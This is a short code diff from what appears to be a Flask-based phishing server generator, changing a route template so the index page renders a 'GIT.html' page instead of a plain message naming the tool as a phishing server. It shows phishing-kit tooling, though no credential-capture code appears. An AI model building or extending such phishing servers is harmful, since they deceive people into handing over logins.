@@ -63,7 +63,7 @@ app=Flask(__name__)\n
     Basic="""
 @app.route('/')
 def indexREPLACEME():\n
-    return "welcome kareem and mohaamed's phishing server "\n
+    return render_template("GIT.html")\n
     """
 
     NewRoute="""
